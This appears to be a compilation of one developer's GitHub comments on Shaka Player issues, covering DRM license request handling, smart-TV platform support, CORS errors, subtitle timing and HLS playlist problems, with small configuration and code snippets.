Do you usually see 100% success rate across browsers for integration tests?. Nevermind I see you just posted about this in #1048.. Ooh, very nice. We would need to know bandwidth and codec information. Thanks Joey.. No, I don't think I need to add new integration tests.. To add more context: we need to be able to set a startTime of 0 in order to support restartable live content.. Our license request bodies look roughly like:\n{\n  authorizationToken: (some data here)\n  licenseChallenge: (base64-encoded license challenge here)\n}\nThe server may send back a response, with HTTP 401, and a response body:\n{\n  errorCode: 1234\n}\nSuppose I know that this means \"Invalid token\". I need to initiate another flow to obtain a new authorizationToken and send the license request again.\nI can't do this with a response filter since those aren't invoked due to HTTP 401. I also don't want to just retry right away, because I need to do some other work before retrying.. Thanks @TheModMaker, let me know if we can help.. This is back on my mind because I'm part of a week-long lockdown to investigate our error rate. So I wanted to add another note:\nIn our production application, error statistics are tracked via New Relic, which informs management / executive decisions about whether or not, for example, we are ready for expanded beta or public launch. Some Shaka errors (notably LICENSE_REQUEST_FAILED) have to be translated to errors in our own domain because we support other players as well and we need to be consistent in our reporting.\nSo there are two main reasons why I would like to make the license request myself:\n\nLicense request failure handling (described in this ticket)\nEnd-to-end error handling\n\nI would argue that Shaka performing the license request does not add value for the client application, because:\n\nThe client almost certainly has its own networking stack already\nThe client provides Shaka the license URL\nThe client has to register request/response filters for license wrapping/unwrapping\n\nI don't really want a handful of hooks into Shaka. It's awkward, when what I really want is to handle the process end-to-end myself. I would far prefer a simple callback on Player, which is invoked when it needs a license. Here is what I propose:\n\nAdd a new property to PlayerConfiguration called drm.licenseRequestHandlers, with keySystems as keys, Functions as values. Player will pass these values on to DrmEngine.\nIf a callback is set for a given keySystem, DrmEngine#sendLicenseRequest_ will forego making the request, and instead invoke the provided callback with the challenge message.\nThe callback is expected to return a license.\nAdd a new error code LICENSE_REQUEST_HANDLER_ERROR in case the callback throws.\nUpdate DrmEngine#unpackPlayReadyRequest_ to simply extract the challenge message, and not to populate a Shaka Request object (since we would want to share this behaviour with the request handlers). Although there is some question of what to do with the HttpHeader PlayReady information.\n\nI can make a PR with these changes but I would like your feedback first.. It has occurred to me that I could potentially get what I want by providing my own networking plugin that proxies requests to our own networking stack. I will look into that as it could be simplest for all involved.. I think I'll register my own plugin for http and https, if requestType === LICENSE handle it myself, and if not pass it off to one of Shaka's HTTP plugins. At quick glance I think that should work.\nI work on a client SDK that provides downstream client UI teams with integrations for two things:\n- players\n- hosted entitlement/DRM services\nIn our architecture, these two concerns are decoupled, and each has a dependency on our core SDK abstractions, but players know nothing about DRM services and DRM services know nothing about playback. This makes it very easy to swap player implementations (e.g. we support playback in Safari via native src=), and we can reuse service integrations across different projects in different HTML5 environments.\nHaving the player do the license request is awkward for us because it involves piping multiple callbacks through our core SDK and reasoning about Shaka's networking behaviour. Philosophically, Shaka's evaluation of HTTP status codes in the networking layer is at odds with our design; we consider this to be application-specific business logic. An example of this is what I described earlier: a license proxy may provide us an error response which we are expected to handle in a specific way. In order to achieve this now, I do the following:\n- Listen for error events from Shaka\n- Check if error.code === LICENSE_REQUEST_FAILED\n- Check if error.data[0].code === BAD_HTTP_STATUS\n- Rebuild a response object from error.data[0].data so that it matches our networking response API\n- Pass that response object to a callback from one of our DRM service integrations which has domain knowledge of license error codes\n- Triage the error code provided by the license proxy\n- If necessary, initiate an authentication flow with another service\n- Retry playback (call Player#load)\n- Playback succeeds\nIt would be much simpler for us to handle all license networking in our own stack.\nThe historical motivation for this design comes from iOS, where AVPlayer does not do license networking itself. AVPlayer tells the client that it needs a license, and the client can do whatever it wants as long as it provides the player a license. Our design on other platforms has followed this model.. With #1296 this is what I will do:\n```\nvar customHttpPlugin = function (uri, request, requestType) {\n  if (requestType === shaka.net.NetworkingEngine.RequestType.LICENSE) {\n    // Send it to my networking stack\n  } else if (shaka.net.HttpFetchPlugin.isSupported()) {\n    return shaka.net.HttpFetchPlugin(uri, request, requestType);\n  } else {\n    return shaka.net.HttpXHRPlugin(uri, request, requestType);\n  }\n}\nshaka.net.NetworkingEngine.registerScheme('http', customHttpPlugin,\n    shaka.net.NetworkingEngine.PluginPriority.APPLICATION);\nshaka.net.NetworkingEngine.registerScheme('https', customHttpPlugin,\n    shaka.net.NetworkingEngine.PluginPriority.APPLICATION);\n```\nIt makes me realize it would be nice if I could register multiple plugins for the same scheme, and fall through them when I needed to. But that might be too much... this will do.. Going to close this given the workaround I proposed above.\nIf there is an opportunity for redesign in a future major version increment, please consider adding a formal mechanism for the client to handle the license request. Thanks for the discussion!. I saw this MediaError with code 5 in another scenario recently. This is an MS-specific error code.\nIt used to be described here:\nhttps://msdn.microsoft.com/en-us/library/ff974742(v=vs.85).aspx\nBut now the above link just forwards to MDN. Wayback Machine to the rescue:\nhttps://web.archive.org/web/20171004203049/https://msdn.microsoft.com/en-us/library/ff974742(v=vs.85).aspx\n\nMEDIA_ERR_SRC_NOT_SUPPORTED (5)\nThe encrypted media stream could not be played. This is because of one of the following conditions:\n- A key was not provided and a onmsneedkey handler was not provided\n- The provided key could not be applied.\n- Decryption is not supported for this media data.\n\nJust FYI some DRM errors in IE11 (and it seems Edge) are published as errors from the video element, instead of from a MediaKeySession.. > Possibly expose an API to update video tag back to original state since the player updates the src on initialization.\nYou can call Player#unload to do this.. I actually just thought it may have been an oversight in the AbrManager interface, since as you say, custom implementations may want an async shutdown. But I also don't see the point in making things async without a reason. Thanks for the answer.. I think I'm having the same issue, and I feel like it's new because I've never noticed it before. I haven't gotten around to thoroughly testing yet.\n@KieronAllsop are you seeing this in Firefox too? I have only tested in Chrome and that made me think it was a Chrome bug because of the particular behaviour. I will try to test in other browsers.\nHere's what's happening to me:\n\nLoad playback and force license request to fail (I'm setting error response in Charles Proxy)\nChange Charles Proxy settings to allow license request to succeed\nTry to load again\nPlayer hangs\n\nI traced it down to this line in DrmEngine#destroy:\nvar p = activeSession.session.close() || Promise.resolve();\nThe call to MediaKeySession#close never resolves, so Player#unload never resolves either.. I can also reproduce in the demo app using the same steps as @KieronAllsop described.\nEdit*\nIt's worth pointing out that I don't see this with all content. Some of our content is able to recover through this scenario. I wonder if it's related to license server configuration.. Sorry, I was on vacation and didn't respond earlier. Thanks for the update @joeyparrish!. @joeyparrish would Shaka team consider this workaround? #1168 \nI've deployed a fork of Shaka in our projects which uses this workaround, and haven't encountered any issues in the wild (that I know of). In general I prefer not to maintain a fork though.. @joeyparrish I haven't looked at this issue directly myself, but I am surprised that this does not produce a ENCRYPTED_CONTENT_WITHOUT_DRM_INFO error. Would that not be the expected result in these circumstances?. Will you share the results of the survey once it's done?. Thanks @TheModMaker, I'm grateful for the help.. Thanks for the info. Regarding (3), we have an open ticket internally which alleges that you can reproduce the problem in VOD (or perhaps restarted live content) by doing a lot of scrubbing. The ticket was filed by one of our client architects who believes this is the cause of cache misses at the CDN. I've never reproduced this myself.. Thanks @joeyparrish, I think I have the answers I need. I'll reopen if I have to follow up again.. I'm having a compiler issue. Here is the offending function:\n```\n/\n * @param {!string} uri\n * @return {!Promise}\n * @private\n */\nshakaDemo.requestCertificate_ = function(uri) {\n  var netEngine = shakaDemo.player_.getNetworkingEngine();\n  var requestType = shaka.net.NetworkingEngine.RequestType.APP;\n  var uris = / @type {!Array.} */ ([uri]);\n  var request = shaka.net.NetworkingEngine.makeRequest(uris);\nreturn netEngine.request(requestType, request).then(function(response) {\n    return response.data;\n  });\n};\n```\nThis is the message I get from the compiler:\n[INFO] Compiling the demo app (debug)...\n/Users/chrisf/Documents/github_forks/shaka-player/demo/asset_section.js:143: ERROR - Property makeRequest never defined on shaka.net.NetworkingEngine\n  var request = shaka.net.NetworkingEngine.makeRequest(uris);\n                                           ^^^^^^^^^^^\nI thought maybe it was the args I was passing to makeRequest, so I've tried all of the following:\nvar request = shaka.net.NetworkingEngine.makeRequest([uri]);\nvar request = shaka.net.NetworkingEngine.makeRequest(uris);\nvar request = shaka.net.NetworkingEngine.makeRequest(uris, null);\nvar request = shaka.net.NetworkingEngine.makeRequest(uris, shaka.net.NetworkingEngine.defaultRetryParameters);\nI'm not sure what to do. Also, is the type annotation necessary below?\nvar uris = /** @type {!Array.<string>} */ ([uri]);\nThanks for the help.. Thanks @TheModMaker, I've submitted a PR.. I may be able to send a custom application that will play content that is not multiplexed; I'll have to look into it. I will get back to you.. I just tested again on master and it plays for me as well. Thanks for the follow up.. We have HLS-PR test content. I will send you an email.. I just noticed that the KEYFORMAT for our HLS-PR content is just KEYFORMAT=\"com.apple.streamingkeydelivery\":\n```\nEXTM3U\nEXT-X-VERSION:5\nCreated with Unified Streaming Platform(version=1.7.18)\nEXT-X-PLAYLIST-TYPE:VOD\nEXT-X-MEDIA-SEQUENCE:1\nEXT-X-INDEPENDENT-SEGMENTS\nEXT-X-TARGETDURATION:3\nEXT-X-KEY:METHOD=SAMPLE-AES,URI=\"skd://MkJDQzZGRjYtMkVFMC00NTVGLTkwRTMtRjIwOUMxM0ZCQUQy\",KEYFORMAT=\"com.apple.streamingkeydelivery\",KEYFORMATVERSIONS=\"1\"\nUSP-X-TIMESTAMP-MAP:MPEGTS=900000,LOCAL=1970-01-01T00:00:00Z\n```\nWhat is the KEYFORMAT defined by Microsoft?. Thanks for the example. I don't think my test content has these headers.. Awesome! Thank you.. Thanks!. We spend quite a lot of time integrating with ad SDKs, including YoSpace, FreeWheel, and IMA. Currently my team doesn't handle this work, it's done by downstream teams which use our player abstractions, but I often provide support.\nOne feature I developed recently to handle emsg events from Shaka is a simple queue which collects emsg events, and polls the video element to check if the playhead has passed the startTime for any emsg events in the queue. If it has, republish the event. The recommended polling interval is 250ms.\nWould such a feature be useful to Shaka? Perhaps it could be a configurable parameter on the player, something like emsgPollingInterval, which could be set to 0 to disable the behaviour. I could submit a PR for this, if you want.\nIn general, ad SDK integrations occupy a lot of people's time in our work, on a lot of different teams, so we welcome this line of investigation!. I've updated it just now with another method, onBeforeLoad, which would be called before playback to populate the AssetInfo.\nI could create a PR for this.\nEdit: updated again to remove onError, and replaced it with an object to hold listeners for any event.. I wonder if something like this would be useful for #1169 as well.. Yes the purpose would be to set up and demo behaviour with different content libraries. Application developers would write their own plugins to integrate with their own services. But Player would have no awareness of this, it's purely a demo app integration.\nYou'll see what I mean in the PR. It's WIP so don't merge. This was illuminating as I realize it will require a bit more thought. An implementation would probably be simplest if there was an additional item in the asset list called \"Custom Asset (by plugin)\". Otherwise, an asset would be passed to onBeforeLoad which wasn't needed. Perhaps onBeforeLoad should be renamed requestAssetInfo, and would return a Promise<shakaAssets.AssetInfo>. I will do some more work on the PR to show you what I mean.. I updated the PR some more. It's still a WIP but I'd welcome feedback.. On further reflection, I think this would only be substantially useful if integration with content services, via these plugins, could be automated. This will take me some time, so I will update this ticket when I have a poc ready.. It's no problem Joey, no apology necessary. We prioritized this because we think it would make it trivially easy to repro bugs, and because it could accelerate development on new features like #382 because we could provide a catalogue of test content.\nSince this is a new feature we would like your feedback on design. Thanks!. I've been able to complete a license request, but haven't actually gotten playback yet. My next steps in testing will be to do a custom build and integrate it with our custom app to see the results.. @tchakabam thanks for the share. In general I am familiar with playback via the native Safari player. This uses the keySystem com.apple.fps.1_0, which has different behaviour than com.apple.fps.2_0 (which is required for playback via MSE).\nCompared to the work required to play HLS-FP via MSE, playback via the native player is relatively easy. Apple provides a reference implementation in the FairPlay SDK. For this reason I'm of the opinion that Shaka should not support com.apple.fps.1_0, but I don't know if the wider community agrees.. @sandersaares Thank you for sharing that, because I'm concerned that client teams misunderstand what they are asking for when they ask Shaka team to support playback via src=. The native Safari player is at the same level of abstraction as Shaka player; Shaka should not wrap it. Wrapping it will lead to client teams thinking that playback issues via src= are issues with Shaka (instead of issues with Safari).\nI am only working on this topic sporadically because my application provides playback in Safari via src=, so this isn't high priority for us. If you have some time or resources to contribute to this, what this branch needs is some testing with FP-protected content. The test content I was working with previously was problematic (possibly due to multiplexed content being transmuxed, see #1143). I haven't put the time into testing with our real production content.. @joeyparrish I think we may be closer to getting this working than you think. The problems I'm blocked by are not related to Fairplay, they're all content-related. I'm not really very familiar with HLS or actual media issues, though. I can contribute time and test content, but is there someone from Shaka team who could work with me to troubleshoot these content issues? I have a contact at Apple on the WebKit team who could unblock us if we run into a wall.\nOur content plays fine in Safari via src=, but when I try to play in Shaka, the HLS parser throws HLS_COULD_NOT_PARSE_SEGMENT_START_TIME because hasPesPacket was false. I haven't filed a ticket because it's cumbersome for us to share our content with industry partners. (The guy sitting next to me has taken over work on #1198 to try to remedy this.). Tizen definitely does not support it. I also read somewhere (maybe here) that Chromecast team recommends against multiple video elements, but I'm not sure what that means. I'm happy to contribute for this but it probably won't happen soon.. 2017 model Tizen TV's (Tizen 3.0) support modern EME. Shaka will work out of the box on this platform. I have not tested any 2018 model TV's but I expect it will work there too.. @Cromefire take a look at http_plugin, at the bottom:\nshaka.net.NetworkingEngine.registerScheme('http', shaka.net.HttpPlugin);\nshaka.net.NetworkingEngine.registerScheme('https', shaka.net.HttpPlugin);. CLA is failing because I'm on a new machine, I'll address that. I added an alternate email to my Google account. Am I in the clear @googlebot?. This PR can be declined in favour of @pcruiksh's #1374. I believe this is supported in Safari right now (at least I've seen the behaviour, I haven't checked if it's indeed this API). But what does this have to do with Shaka?. Two things:\n- I noticed that there is no test coverage for the data passed to Error by HttpPlugin, so I have not added anything. However, perhaps it would be wise to add coverage. I could do so in a separate PR.\n- I did not make changes to DataUriPlugin because I was unsure if it applied, I'm not familiar with use cases for the data scheme. Updated!\nNote that I haven't done my own smoke test on these new commits because I'm blocked by #1278. I'll be happy to test once that is sorted.. Thanks for the review guys. You can circumvent CORS security a variety of ways for the purposes of testing:\n\nDisable same-origin policy (for Chrome: https://stackoverflow.com/a/6083677)\nAccess-Control-Allow-Origin: * extension for Chrome\nRewrite response headers via Charles Proxy, Fiddler, etc\n\nThis would at least tell you if you had a CORS issue.. If by \"trap\" you mean cancel the license request and provide a custom response, AFAIK there is no way to do this in Shaka. I have an open issue #1075 to allow the client to handle the license request, but it is pending Shaka team's approval of the design.\nIf you just need to customize the license request and process the response, you need to register networking filters:\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-license-server-auth.html. I'm making a push for our next major version update to drop support for IE11, so this sounds good to me. . Yes I'm still interested in this PR, though it's not a high priority. If you'd like to decline for housekeeping purposes, feel free, I can reopen later if I have the time to work on it.. > an additional warning if the variant has DrmInfos but every single one of them ends up with no licenseServerUri\nThis sounds like an actual error scenario to me, though I'm not sure if Shaka should fail with an assertion or publish a shaka.util.Error.\nBut perhaps there are some edge cases where clients know that some content will have ContentProtection blocks in the manifest, but the content itself is clear, so they don't provide license urls?. What is the use case for no-cors? This is what the spec says:\n\n\"no-cors\" \nRestricts requests to using CORS-safelisted methods and CORS-safelisted request-headers. Upon success, fetch will return an opaque filtered response.. Sorry for missing that!. FYI this is a duplicate of #484, which has #1010, but it looks like progress on that has stalled. May be worth looking at for reference.. I've rebased but I see what @theodab pointed out, we still have an uncaught error in the promise chain in NetworkingEngine. Investigating.... @theodab I've filed #1323 for the uncaught error in the Promise. I believe that is a separate issue than the one resolved in this PR.. However, I just noticed this in the spec (emphasis added):\nThe key is no longer usable for decryption because its expiration time has passed. The time represented by the expiration attribute MUST be earlier than the current time. All other keys in the session MUST have this status.\n\nhttps://www.w3.org/TR/encrypted-media/#dom-mediakeystatus-expired. Sounds good.. Thanks for the breakdown! I did not realize that renewal and rotation were different concepts. One thing I'm still unclear on: How is rotation handled? What signals Shaka that rotation must happen? If DrmEngine isn't listening for encrypted events (due to pssh in the manifest), how does it know to create a new session? (updated kid's from the manifest maybe...?)\nThanks again.. Thanks again for the information. I think our organization is still looking for an appropriate solution, or set of solutions, that can work across device platforms, since different players and DRM's behave differently.. How about a new property on shakaExtern.DashManifestConfiguration:\n/**\n * @property {number} minClockSyncInterval\n * The length of time, in seconds, that Shaka will wait in between clock synchronization\n * requests. Set to 0 by default, meaning the player will perform clock sync with every\n * manifest request.\n */. I may have made a mistake, and missed something before. DashParser#processManifest_ does this:\n```\n...\nif (this.manifest_) {\n  // This is a manifest update, so we're done.\n  return Promise.resolve();\n}\n// This is the first manifest parse, so we cannot return until we calculate\n// the clock offset.\nlet timingElements = XmlUtils.findChildren(mpd, 'UTCTiming');\n...\n```\nSo the player will only do clock sync once, for the first manifest? If that's the case then I don't need a configurable interval.. Ok my bad, I totally missed that and thought it was updating with every manifest request.. Oh great, thanks for clarifying. So if I am contributing new code, I will follow the Google style guide.. I don't think that Shaka team has investigated this platform specifically. Generally speaking, Shaka supports any platform that is spec-compliant, but in my experience these kinds of smart TV platforms are not very mature and require extensive testing, validation, and workarounds. Things are getting better, though.\nWe will soon be investigating LG WebOS for DASH-PR, so you may soon see tickets related to this platform, and you'll get a better sense for whether or not Shaka will work on these TV's.. @ismena I have a question. It seems there are at least 3 projects using Shaka on LG WebOS: @kingctan, @avelad, and me. Would Shaka team be willing to adopt this as an officially supported platform?. @shaka-bot reopen please\nHere is the Shaka support page for the WebOS TV I have:\n```\nMozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 WebAppManager\nv2.3.6\n{\n  \"manifest\": {\n    \"application/dash+xml\": true,\n    \"application/x-mpegurl\": true,\n    \"application/vnd.apple.mpegurl\": true,\n    \"application/x-offline-manifest\": true,\n    \"mpd\": true,\n    \"m3u8\": true,\n    \"application/vnd.ms-sstr+xml\": false,\n    \"ism\": false\n  },\n  \"media\": {\n    \"video/mp4; codecs=\\\"avc1.42E01E\\\"\": true,\n    \"video/mp4\": true,\n    \"video/mp4; codecs=\\\"avc3.42E01E\\\"\": true,\n    \"video/mp4; codecs=\\\"hev1.1.6.L93.90\\\"\": true,\n    \"video/mp4; codecs=\\\"hvc1.1.6.L93.90\\\"\": true,\n    \"video/mp4; codecs=\\\"hev1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": true,\n    \"video/mp4; codecs=\\\"hvc1.2.4.L153.B0\\\"; eotf=\\\"smpte2084\\\"\": true,\n    \"video/mp4; codecs=\\\"vp9\\\"\": false,\n    \"video/mp4; codecs=\\\"vp09.00.10.08\\\"\": false,\n    \"audio/mp4; codecs=\\\"mp4a.40.2\\\"\": true,\n    \"audio/mp4\": true,\n    \"audio/mp4; codecs=\\\"ac-3\\\"\": true,\n    \"audio/mp4; codecs=\\\"ec-3\\\"\": true,\n    \"audio/mp4; codecs=\\\"opus\\\"\": false,\n    \"audio/mp4; codecs=\\\"flac\\\"\": false,\n    \"video/webm; codecs=\\\"vp8\\\"\": true,\n    \"video/webm\": true,\n    \"video/webm; codecs=\\\"vp9\\\"\": true,\n    \"video/webm; codecs=\\\"av1\\\"\": false,\n    \"audio/webm; codecs=\\\"vorbis\\\"\": false,\n    \"audio/webm\": false,\n    \"audio/webm; codecs=\\\"opus\\\"\": false,\n    \"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\n    \"video/mp2t\": false,\n    \"video/mp2t; codecs=\\\"avc3.42E01E\\\"\": false,\n    \"video/mp2t; codecs=\\\"hvc1.1.6.L93.90\\\"\": false,\n    \"video/mp2t; codecs=\\\"mp4a.40.2\\\"\": false,\n    \"video/mp2t; codecs=\\\"ac-3\\\"\": false,\n    \"video/mp2t; codecs=\\\"ec-3\\\"\": false,\n    \"text/vtt\": true,\n    \"application/mp4; codecs=\\\"wvtt\\\"\": true,\n    \"application/mp4\": true,\n    \"application/ttml+xml\": true,\n    \"application/mp4; codecs=\\\"stpp\\\"\": true\n  },\n  \"drm\": {\n    \"org.w3.clearkey\": {\n      \"persistentState\": false\n    },\n    \"com.widevine.alpha\": {\n      \"persistentState\": false\n    },\n    \"com.microsoft.playready\": {\n      \"persistentState\": false\n    },\n    \"com.apple.fps.2_0\": null,\n    \"com.apple.fps.1_0\": null,\n    \"com.apple.fps\": null,\n    \"com.adobe.primetime\": null\n  },\n  \"offline\": true\n}\n```\nThe TV is a UJ6500. In \"About This TV\" it says Software Version 4.70.10, although I'm not totally clear if this is the WebOS version.. Could we reopen this as an official WebOS support issue? I have an internal ticket assigned to me to ensure Shaka works out of the box on LG TV's, so I'm happy to help get this resolved.. Ok here's what I've learned so far.\nWebOS SDK\nhttp://webostv.developer.lge.com/sdk/download/download-sdk/\nUsing WebOS CLI\nhttp://webostv.developer.lge.com/sdk/using-webos-tv-cli/\nTesting a WebOS app\nhttp://webostv.developer.lge.com/sdk/using-webos-tv-cli/testing-web-app-cli/\nWebOS Application Lifecycle\nhttp://webostv.developer.lge.com/develop/app-developer-guide/web-app-lifecycle/\nYou can launch an app from the command line via something similar to:\nares-launch --device deviceName com.domain.app --params \"{'url':'www.foo.com'}\"\nYou can listen for this value in WebOS:\ndocument.addEventListener('webOSLaunch', function (event) {\n  console.log(event.detail.url); // www.foo.com\n});\nDoes this help?. FYI we believe 2017 model WebOS TV's suffer from the same bug described here:\nhttps://groups.google.com/forum/#!msg/shaka-player-users/DZuG1MzR2DA/R7Fduj_E2OMJ\n@avelad Do your media segments include multiple PSSH boxes, or just one?. Ok thanks. We're going to do some testing with our streams to remove all but one PSSH and see if we are able to play.. Thanks @TheModMaker!. @joeyparrish https://github.com/google/shaka-player/commit/4dec8786bd5ea5876a4b1e57439987fd030a1519 changed XmlUtils.findChildren and moved child instanceof Element out of the assertion and into the core filter. This check is returning false in IE11 in our custom app, and playback is failing. If I remove the check, playback works fine.\nI have no explanation for why the instanceof check returns false in our custom app. Shaka demo app works fine. If I write a simple test app and parse the same mpd, the instanceof check returns true. We don't polyfill DOMParser or anything like that so I have no idea why we're seeing this problem. We'll keep digging.\n(If you have any ideas or speculation, I'd be happy to hear it.). Sorry yes @shanmugapriyaEK and I are working on the same app.. Also, I should add, child instanceof Element returns false whether we test in 2.2.8 or 2.3.3.\nWe also get the error in Edge.. I have both our custom app, and the Shaka demo app, running side-by-side in separate tabs in MS Edge 40.15063.0.0, both with uncompiled Shaka v2.3.3. I'm setting a breakpoint in MpdUtils.parseXml, on line 418 if (xml) {. I am testing with the same mpd in both.\nIn our custom app, checking xml instanceof Document returns false. In the Shaka demo app, the same check returns true. I am baffled by this result.. Fyi our custom app index.html declares <!DOCTYPE html>.. Here is the content I'm testing with:\nhttps://qpvod.cdnwo.net.rogers.com/ss/s/astr0632826002107302/2017-07-27-14-39-15/ASTR0632826002107303/output_dash.ism/index-r.mpd. @joeyparrish does the Shaka demo app load the library in a different way than a client app would via the three script tags?\n<script src=\"./debug/shaka-player/third_party/closure/goog/base.js\"></script>\n<script src=\"./debug/shaka-player/dist/deps.js\"></script>\n<script src=\"./debug/shaka-player/shaka-player.uncompiled.js\"></script>\nI am wondering if IE11/Edge grant different permissions depending on how code is loaded.\nEdit: actually this doesn't make sense, because we get the error even with the compiled version of the Shaka, which gets bundled with our app.. I've determined that this is triggered by some component of our client UI application. I rewrote the client app in a dead simple way and could not reproduce it. It is definitely not a Shaka bug (feel free to add external label).\nI don't know exactly the source... there are some UI libraries we use (VueJS, webcomponents.js), perhaps they are having some impact in IE11 and Edge which is triggering this behaviour (shadow DOM? I barely know anything about UI dev anymore).. I've narrowed it down to an old version of webcomponentsjs that we use:\nhttps://github.com/webcomponents/webcomponentsjs/releases/tag/v0.7.23\nWhen I remove this dependency from our app, I don't get the instanceof failures. Still not sure exactly what is causing the failure though.. If I'm able to isolate the bug and provide a reproducible test case, I will file a bug with Microsoft and link it here. I will also test if newer versions of webcomponentsjs have the same issue. I'll keep you posted.. Looks like webcomponentsjs polyfills Document, Element, etc. That's what's causing the failures.. I have not yet tested a newer version of webcomponentsjs. I just filed a ticket internally to upgrade. If you don't mind waiting until the end of next week, then I'll update you with the results of the upgrade. If it's still a problem, I will file a ticket with webcomponentsjs.. @joeyparrish we are satisfied to close this ticket. Thanks. Thanks for the information!. This looks similar to #1094.. @TheModMaker is this ticket a duplicate of #1107 now?. Thanks @ismena. Logging would not help because I'm often working backwards from data which tells me that our users encounter this error in the wild, but we don't actually have a reproducible test case (yet).\nI see the problem you're describing. Variants may be restricted for a variety of overlapping reasons. It could be that all variants are restricted, but for different reasons.\nPerhaps restrictions need to be more formally defined in the player, and the collection of all restrictions can be passed along with the error. This is just a thought, and would need some fleshing out.. Having said that, splitting the error into two would, on its own, be extremely helpful. :). @joeyparrish I am confirming with our product team but I believe we have two basic requirements:\n\nNeed to notify the user that they can't connect a non-HDCP-compliant external display\nNeed to notify the user that some variants (e.g. 4K) are restricted\n\nI expect that this would require some non-trivial refactoring in Shaka. Do you think it is feasible for 2.5? I am happy to contribute if we agree on a design (and if product confirms we need this).. Edit: reflecting on it some more, I realize you're right. The app may have selected a minimum bitrate of 3Mbps, leaving some playable higher level variants, but high level variants could end up producing an error due to misconfiguration at the headend. Your plan sounds good to me.\nWould it be possible to include detailed information? Such as:\n- keyId(s) in the event of missing keys\n- the key status if output was restricted\n~Here's what I think:~\n~1. App-level restrictions which lead to no playable variants should result in a failed assertion with no error code. This is developer error IMO; clients should listen for the streaming event to set appropriate min/max bitrates and languages. Is there any reason this shouldn't work?~\n~2. Missing keys and restricted output should have separate error codes. These error scenarios do not seem logically related to me. Missing keys is likely the result of misconfiguration at the headend (assuming the browser and player are behaving as expected), and restricted output is usually (I think) the result of user error (connecting to non-HDCP compliant display, for instance). These should not share an error code IMO.~\n~If (1) is too onerous, then I actually think RESTRICTIONS_CANNOT_BE_MET should be split into three error codes.~. You may proceed, @googlebot.\nEdit: seems this isn't automated. I confirm that @pcruiksh is permitted to use my commits!. Is this the same as #1215?. Thanks!. @avelad @joeyparrish Are either of you aware of whether DASH specifies how subtitles should be prioritized, if DASH content has both CEA-608/708 in the video stream, but also side-loaded text tracks?\nI would assume that the presence of side-loaded text tracks means that they should be prioritized over those embedded in the streams. But section 6.4.5 of IOP (Guidelines for side-loaded TTML and WebVTT files) does not specify.. Yep, if I add the PTO back in, it works again. That is, I made this hacky change in TextEngine#appendBuffer:\nvar pto = /* I just did a hardcoded calculation of pto / timescale from the manifest of the stream I was watching*/;\nvar time = {\n  periodStart: this.timestampOffset_ + pto,\n  segmentStart: this.timestampOffset_ + startTime + pto,\n  segmentEnd: this.timestampOffset_ + endTime + pto\n};. @TheModMaker has Shaka been ignoring PTO for media times up until 2.3.3? It appears to be the case, at least for every version between 2.2.8 through 2.3.2.\nEdit: to clarify: prior to 2.3.3, when StreamingEngine called MediaSourceEngine#appendBuffer, it would add period.startTime to the startTime and endTime.. @TheModMaker I got some support from the ExoPlayer team because these text tracks are displayed in Exo. See analysis here https://github.com/google/ExoPlayer/issues/4132#issuecomment-381713040\nIt seems that IOP instructs clients to ignore PTO in cases where subtitles are side-loaded. I realize I did not explicitly say that this was my use case in my original post; sorry for any misunderstanding.\n~Is Shaka able to differentiate between WebVTT tracks packaged in fmp4 containers versus ones which are side-loaded (for the purposes of timing)? If not, this would seem to be a bug.~\nEdit: on reflection, it seems that this is the key passage in IOP section 6.4.5:\n\nIf segmented subtitles are needed, such as for live sources, ISOBMFF-packaged TTML or WebVTT segments shall be used with timing according to [29]. In particular, this means that the TTML timing inside the segments is with respect to the media timeline.\n\nIt seems it is unclear what the client is supposed to do when segmented subtitles are not packaged in ISOBMFF containers. Would Shaka be able to ignore PTO in this case? Or is this behaviour essentially undefined?. Thanks for your help, I will send this issue back to our packaging teams.. I need to investigate a workaround for this issue on the client. One thing I've tried is processing the manifest response to set presentationTimeOffset=0 for text tracks only. But this doesn't work. If I do this, Shaka doesn't fetch text tracks at all. I am trying to do this with this manifest:\nhttps://dfwlive-sponsored.secure.footprint.net/Content/DASH.abre/Live/channel(FBNHD-1381.dfw.720.mobile)/manifest.mpd\nBut the hack I described here https://github.com/google/shaka-player/issues/1405#issuecomment-380564482 does work.\nAre different AdaptationSet allowed to contain different PTO values? Are there some circumstances under which Shaka would not fetch segments at all?. It's possible to play mp3 files using an <audio> element, Shaka is not required:\nhttps://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio. Ah, then you will want to follow #816, which is the same thing. (Although I don't know if offline storage of single files will be supported, someone from Shaka team will have to comment on that.). Interestingly, the distance from the live edge appears to be growing. Today segments are ~24 hrs further from the live edge than it was last night.. I now understand that Exo has the behaviour described in #999, and ignores device time in cases of SegmentTemplate + SegmentTimeline.\nOur packager restarted the stream last night and it works, but has advised us that it will be a bit unstable as they identify the problems they're having.\nThanks, I will close.. Error 9009 was retired in v2.3.4, so it would appear you are using Shaka v2.3.3 or older.\nThis error:\n\nFailed to load https://my.url.tv/folder/segment_540p_452131.ts: Request header field Range is not allowed by Access-Control-Allow-Headers in preflight response.\n\nis a CORS error. The server does not support cross-origin requests which have the Range header. You can read more about CORS here:\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\nIn order for you to use Range, the server will need to return an Access-Control-Allow-Headers  header, in the preflight response, which includes Range. Can you share the full request/response cycle?. I believe you are able to play in Shaka sample app because it includes mux.js to transmux your TS segments to fmp4. To enable this in your custom app, you will need to include window.muxjs.. @sergioavazquez you mentioned that your Widevine content is working. What DRM are you using for the content which won't play? If you are attempting to play Fairplay-protected content, this won't work in Chrome (or in Safari... see #382).. These two playlists:\nhttps://lsd2-latam.secure2.footprint.net/hls-live/streamroot_lsd2latam-tectv/definst/live/stream3.m3u8\nhttps://rbtvdiglinear-i.akamaihd.net/hls/live/241719/ATfallback/master_1660.m3u8\n...are variant playlists and cannot be provided to Shaka directly. This is why you are getting error 4022. You need to provide a master playlist. You can take a look at some of the playlist examples from the HLS spec to see the difference:\nhttps://tools.ietf.org/html/draft-pantos-hls-rfc8216bis-00#section-8.4\nEssentially, a master playlist is a playlist which lists other playlists, which are valled variant (or media) playlists. Those variant playlists list the actual video segments.\nWhen playing HLS, Shaka will make a partial segment request using a Range header. I'm not familiar with the specific behaviour and reasons why (hopefully someone can comment). However, in order for this request to succeed, the server will need to allow the Range header 